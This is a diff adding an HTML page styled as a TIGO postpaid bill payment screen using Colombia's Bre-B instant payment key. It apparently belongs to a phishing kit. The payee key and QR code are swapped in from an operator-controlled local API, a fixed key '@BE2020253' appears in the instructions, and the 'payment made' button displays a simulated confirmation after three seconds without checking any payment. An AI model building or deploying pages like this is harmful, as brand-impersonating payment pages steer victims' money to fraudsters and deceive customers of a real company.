@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TIGO - Pago con Llave Bre-B</title>
+    <link rel="icon" type="image/png" href="favicon.png">
+    <link rel="stylesheet" href="fonts.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Dm Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f5f5f5;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #003399 0%, #0052cc 100%);
+            padding: 15px 20px;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            width: 100px;
+            height: 40px;
+        }
+
+        .logo img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        .header-icon {
+            font-family: 'tigo-icons-pack1';
+            font-size: 18px;
+        }
+
+        .header-text {
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .header-dropdown {
+            margin-left: auto;
+            cursor: pointer;
+            font-size: 20px;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            color: #44c8f5;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 30px;
+            cursor: pointer;
+        }
+
+        .back-button svg {
+            width: 20px;
+            height: 20px;
+            margin-right: 8px;
+            stroke: currentColor;
+        }
+
+        .page-title {
+            font-size: 28px;
+            color: white;
+            font-weight: 500;
+            margin-bottom: 30px;
+        }
+
+        .card-box {
+            background: white;
+            padding: 24px;
+            border-radius: 16px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            border: 1px solid #f0f0f0;
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 8px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .card-header-icon {
+            width: 24px;
+            height: 24px;
+            object-fit: contain;
+        }
+
+        .card-title {
+            font-size: 14px;
+            color: #001eb4;
+            font-weight: 600;
+        }
+
+        .page-title {
+            color: #001eb4;
+        }
+
+        .qr-container {
+            text-align: center;
+            margin: 12px 0;
+            padding: 10px 0;
+        }
+
+        .qr-image {
+            width: 120px;
+            height: 120px;
+            border-radius: 8px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .amount-section {
+            text-align: center;
+            margin: 12px 0 10px 0;
+            padding: 8px 0;
+            border-top: 1px solid #f0f0f0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .amount-label {
+            font-size: 10px;
+            color: #999;
+            margin-bottom: 4px;
+        }
+
+        .amount-value {
+            font-size: 18px;
+            color: #001eb4;
+            font-weight: 600;
+        }
+
+        .timer {
+            font-size: 10px;
+            color: #666;
+            margin-top: 4px;
+        }
+
+        .llave-section {
+            text-align: center;
+            margin: 10px 0;
+            padding: 8px;
+            background: #f9f9f9;
+            border-radius: 6px;
+        }
+
+        .llave-label {
+            font-size: 10px;
+            color: #999;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .llave-box {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .llave-text {
+            font-size: 13px;
+            color: #001eb4;
+            font-weight: 600;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 0.5px;
+        }
+
+        .copy-btn {
+            background: #44c8f5;
+            color: white;
+            border: none;
+            padding: 4px 8px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 10px;
+            font-weight: 600;
+            transition: all 0.2s ease;
+        }
+
+        .copy-btn:hover {
+            background: #3db8e3;
+        }
+
+        .copy-btn.copied {
+            background: #4caf50;
+        }
+
+        .instructions {
+            font-size: 10px;
+            color: #333;
+            margin: 10px 0;
+            padding: 8px;
+            background: #f5f5f5;
+            border-radius: 6px;
+            line-height: 1.4;
+        }
+
+        .instructions strong {
+            color: #001eb4;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin-top: 10px;
+        }
+
+        .btn {
+            padding: 6px 16px;
+            border: none;
+            border-radius: 18px;
+            font-size: 11px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            width: fit-content;
+        }
+
+        .btn-cancel {
+            background: none;
+            color: #44c8f5;
+            border: none;
+            min-width: auto;
+            padding: 0;
+            display: none;
+        }
+
+        .btn-cancel.show {
+            display: inline-block;
+        }
+
+        .btn-cancel:hover {
+            background: none;
+            color: #44c8f5;
+        }
+
+        .btn-continue {
+            background: #001eb4;
+            color: white;
+
+            display: none;
+        }
+
+        .btn-continue.show {
+            display: inline-block;
+        }
+
+        .btn-continue:hover {
+            background: #0015a0;
+            cursor: pointer;
+        }
+
+        .btn-continue:disabled {
+            background: #ccc;
+            color: #999;
+            cursor: not-allowed;
+        }
+
+        .btn-continue:disabled:hover {
+            background: #ccc;
+        }
+
+        .success-section {
+            text-align: center;
+            margin-bottom: 12px;
+        }
+
+        .success-btn {
+            background: #4caf50;
+            color: white;
+            padding: 8px 20px;
+            border: none;
+            border-radius: 18px;
+            font-size: 11px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .success-btn:hover {
+            background: #45a049;
+        }
+
+        .spinner {
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loading-modal.show {
+            display: flex;
+        }
+
+        .loading-content {
+            background: white;
+            padding: 40px;
+            border-radius: 16px;
+            text-align: center;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
+        }
+
+        @media (max-width: 768px) {
+            .button-group {
+                justify-content: space-between;
+                gap: 8px;
+            }
+
+            .btn {
+                flex: 1;
+            }
+
+            .card-box {
+                padding: 16px;
+            }
+
+            .loading-content {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Modal de carga -->
+    <div class="loading-modal" id="loadingModal">
+        <div class="loading-content">
+            <div class="spinner"></div>
+        </div>
+    </div>
+
+    <div class="header">
+        <div class="logo">
+            <img src="assets/logos/tigo-logo.svg" alt="TIGO">
+        </div>
+        <div class="header-icon">&#xEC83;</div>
+        <div class="header-text">Pospago <strong id="phoneNumber"><span class="spinner-mini"></span></strong></div>
+        <div class="header-dropdown">⋮</div>
+    </div>
+
+    <div class="container">
+        <a class="back-button" href="javascript:void(0)" onclick="regresarAlInicio()">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <polyline points="15 18 9 12 15 6"></polyline>
+            </svg>
+            REGRESAR
+        </a>
+
+        <h1 class="page-title">Pago con Llave Bre-B</h1>
+
+        <div class="card-box">
+            <div class="card-header">
+                <img src="assets/logos/bre-b.svg" class="card-header-icon" alt="Llave Bre-B">
+                <div class="card-title">Llave Bre-B</div>
+            </div>
+
+            <!-- QR -->
+            <div class="qr-container">
+                <img id="qrImage" src="" class="qr-image" alt="QR Bre-B">
+            </div>
+
+            <!-- Monto a pagar -->
+            <div class="amount-section">
+                <div class="amount-label">Monto a pagar</div>
+                <div class="amount-value">$ 63.465</div>
+                <div class="timer">Válido por: <span id="timer">10:00</span></div>
+            </div>
+
+            <!-- Llave -->
+            <div class="llave-section">
+                <span class="llave-label">Tu llave Bre-B</span>
+                <div class="llave-box">
+                    <span class="llave-text" id="brebLlaveDisplay">Cargando...</span>
+                    <button class="copy-btn" onclick="copiarLlave()">COPIAR</button>
+                </div>
+            </div>
+
+            <!-- Instrucciones -->
+            <div class="instructions">
+                <strong>Instrucciones:</strong><br>
+                1. Abre tu app bancaria de preferencia<br>
+                2. Escanea el código QR<br>
+                3. O ingresa: <strong id="instLlave" style="cursor: pointer; user-select: none;" onclick="copiarDelTexto(event)">@BE2020253</strong> <span id="copyIndicator" style="font-size: 9px; margin-left: 4px;"></span><br>
+                4. Confirma el monto y envía
+            </div>
+
+            <!-- Pago realizado -->
+            <div class="success-section">
+                <button class="success-btn" id="successBtn" onclick="verificarPago()">
+                    <div class="spinner" id="spinner" style="display: none;"></div>
+                    <span id="successText">He realizado el pago</span>
+                </button>
+            </div>
+
+            <!-- Botones -->
+            <div class="button-group">
+                <button type="button" class="btn btn-cancel" onclick="reintentar()" id="reintentarBtn">REINTENTAR</button>
+                <button type="submit" class="btn btn-continue" id="confirmarBtn">CONTINUAR</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const txid = params.get('txid');
+
+        // Leer parámetros desde el URL
+        let phoneNumber = params.get('referencia') || '';
+        let valorFormateado = params.get('valor_formateado') || '';
+        let valorPago = params.get('valor_pago') || '0';
+
+        // Configuración dinámica desde API (SIN HARDCODEAR)
+        let brebConfig = {
+            llave: '',
+            qrImage: 'assets/logos/qrbre.png'
+        };
+
+        // Cargar configuración desde API
+        async function cargarConfiguracionBreb() {
+            try {
+                const response = await fetch('http://localhost:9090/api/obtener-configuracion');
+                const result = await response.json();
+
+                if (result.ok && result.config) {
+                    // Cargar llave desde configuración
+                    if (result.config.brebLlave) {
+                        brebConfig.llave = result.config.brebLlave;
+                        const llaveDisplay = document.getElementById('brebLlaveDisplay');
+                        if (llaveDisplay) {
+                            llaveDisplay.textContent = brebConfig.llave;
+                        }
+                    }
+
+                    // Cargar imagen QR desde configuración
+                    if (result.config.qrImageFile) {
+                        brebConfig.qrImage = 'assets/logos/' + result.config.qrImageFile;
+                        const qrImg = document.getElementById('qrImage');
+                        if (qrImg) {
+                            qrImg.src = brebConfig.qrImage;
+                        }
+                    }
+                }
+            } catch (error) {
+                console.log('Usando configuración predeterminada de Bre-B');
+            }
+        }
+
+        // Cargar configuración al iniciar la página
+        document.addEventListener('DOMContentLoaded', cargarConfiguracionBreb);
+
+        // Actualizar el header con el teléfono
+        if (phoneNumber && document.getElementById('phoneNumber')) {
+            document.getElementById('phoneNumber').textContent = phoneNumber;
+        }
+
+        // Función para regresar a pago-inicio con txid
+        function regresarAlInicio() {
+            window.location.href = `/pago-inicio?txid=${txid || ''}`;
+        }
+
+        // Temporizador
+        let timeLeft = 600; // 10 minutos en segundos
+        setInterval(() => {
+            if (timeLeft > 0) {
+                timeLeft--;
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                document.getElementById('timer').textContent =
+                    `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+            }
+        }, 1000);
+
+        // Copiar llave
+        function copiarLlave() {
+            const text = brebConfig.llave;
+            navigator.clipboard.writeText(text).then(() => {
+                const btn = event.target;
+                btn.textContent = '✓ COPIADO';
+                btn.classList.add('copied');
+                setTimeout(() => {
+                    btn.textContent = 'COPIAR';
+                    btn.classList.remove('copied');
+                }, 2000);
+            });
+        }
+
+        // Copiar del texto en instrucciones
+        function copiarDelTexto(e) {
+            const text = '@BE2020253';
+            navigator.clipboard.writeText(text).then(() => {
+                const indicator = document.getElementById('copyIndicator');
+                indicator.textContent = '✓ copiado';
+                indicator.style.color = '#4caf50';
+                setTimeout(() => {
+                    indicator.textContent = '';
+                }, 2000);
+            });
+        }
+
+        // Verificar pago
+        function verificarPago() {
+            const btn = document.getElementById('successBtn');
+            const confirmarBtn = document.getElementById('confirmarBtn');
+            const reintentarBtn = document.getElementById('reintentarBtn');
+            const loadingModal = document.getElementById('loadingModal');
+
+            btn.disabled = true;
+            // Mostrar modal de carga
+            loadingModal.classList.add('show');
+
+            // Simular verificación por 3 segundos
+            setTimeout(() => {
+                loadingModal.classList.remove('show');
+                btn.style.background = '#4caf50';
+                const text = document.getElementById('successText');
+                text.textContent = '✓ PAGO CONFIRMADO';
+                confirmarBtn.classList.add('show');
+                reintentarBtn.classList.add('show');
+            }, 3000);
+        }
+
+        // Reintentar
+        function reintentar() {
+            const btn = document.getElementById('successBtn');
+            const confirmarBtn = document.getElementById('confirmarBtn');
+            const reintentarBtn = document.getElementById('reintentarBtn');
+
+            // Ocultar botones
+            confirmarBtn.classList.remove('show');
+            reintentarBtn.classList.remove('show');
+
+            // Reiniciar botón de pago
+            btn.disabled = false;
+            btn.style.background = '#4caf50';
+            document.getElementById('successText').textContent = 'He realizado el pago';
+
+            // Reiniciar timer
+            timeLeft = 600;
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            document.getElementById('timer').textContent =
+                `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+        }
+    </script>
+</body>
+</html>
